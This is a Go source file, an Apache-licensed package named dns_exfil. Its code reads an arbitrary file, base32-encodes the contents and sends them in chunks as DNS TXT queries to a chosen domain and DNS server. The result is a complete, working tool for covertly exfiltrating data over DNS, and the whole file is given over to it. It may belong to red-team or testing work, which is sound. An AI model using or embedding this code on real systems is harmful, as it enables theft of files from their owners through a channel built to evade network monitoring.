/*
Copyright © 2023 MOHAMMED YASIN

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package dns_exfil

import (
	"context"
	"encoding/base32"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/sirupsen/logrus"
)

const (
	maxLabelLen   = 63
	maxDomainLen  = 253
	encodingChunk = 30
	queryTimeout  = 2 * time.Second
	queryDelay    = 50 * time.Millisecond
)

var b32Encoding = base32.StdEncoding.WithPadding(base32.NoPadding)

// Exfiltrate reads the file and sends its contents encoded in DNS TXT queries.
func Exfiltrate(filePath, domain, dnsServer string) error {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("failed to read file: %w", err)
	}

	chunks := encodeChunks(data, domain)
	logrus.Infof("exfiltrating %d bytes in %d DNS queries via %s", len(data), len(chunks), domain)

	resolver := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{Timeout: queryTimeout}
			return d.DialContext(ctx, "udp", dnsServer+":53")
		},
	}

	ctx := context.Background()
	for i, qname := range chunks {
		_, _ = resolver.LookupTXT(ctx, qname)
		logrus.Debugf("[%d/%d] %s", i+1, len(chunks), qname)
		time.Sleep(queryDelay)
	}

	logrus.Infof("exfiltration complete: %d queries sent", len(chunks))
	return nil
}

func encodeChunks(data []byte, domain string) []string {
	var queries []string
	seqNum := 0

	for offset := 0; offset < len(data); offset += encodingChunk {
		end := offset + encodingChunk
		if end > len(data) {
			end = len(data)
		}

		chunk := data[offset:end]
		encoded := strings.ToLower(b32Encoding.EncodeToString(chunk))

		labels := splitLabels(encoded, maxLabelLen)
		seq := fmt.Sprintf("%04x", seqNum)
		qname := seq + "." + strings.Join(labels, ".") + "." + domain

		if len(qname) <= maxDomainLen {
			queries = append(queries, qname)
		} else {
			smaller := encodeSmaller(chunk, domain, seqNum)
			queries = append(queries, smaller...)
		}
		seqNum++
	}

	queries = append(queries, fmt.Sprintf("ffff.end.%s", domain))
	return queries
}

func splitLabels(s string, maxLen int) []string {
	var labels []string
	for len(s) > 0 {
		end := maxLen
		if end > len(s) {
			end = len(s)
		}
		labels = append(labels, s[:end])
		s = s[end:]
	}
	return labels
}

func encodeSmaller(data []byte, domain string, seq int) []string {
	half := len(data) / 2
	var result []string

	for i, part := range [][]byte{data[:half], data[half:]} {
		encoded := strings.ToLower(b32Encoding.EncodeToString(part))
		labels := splitLabels(encoded, maxLabelLen)
		subSeq := fmt.Sprintf("%04x.%d", seq, i)
		qname := subSeq + "." + strings.Join(labels, ".") + "." + domain
		result = append(result, qname)
	}
	return result
}
